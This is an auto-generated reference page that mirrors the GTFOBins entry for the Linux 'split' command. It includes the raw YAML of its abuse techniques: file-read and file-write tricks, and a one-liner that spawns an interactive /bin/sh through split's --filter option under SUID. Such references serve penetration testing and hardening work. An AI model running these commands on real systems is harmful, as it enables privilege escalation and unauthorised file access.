---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# split

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `split` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/split` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [split](../../tools/linux/split.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | split |
| name | split |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/split/ |

## Preserved Source Material

```yaml
_body: ''
_name: split
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/split
functions:
  file-read:
  - code: 'split -b 999 --additional-suffix suffix /path/to/input-file prefix

      cat prefixaasuffix'
    comment: This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure
      to pick a value big enough, instead of `999`.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: The `--additional-suffix` flag is only available in the GNU version.
  file-write:
  - code: split -b 999 --additional-suffix suffix /path/to/input-file prefix
    comment: This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure
      to pick a value big enough, instead of `999`.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: The `--additional-suffix` flag is only available in the GNU version.
  shell:
  - code: split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
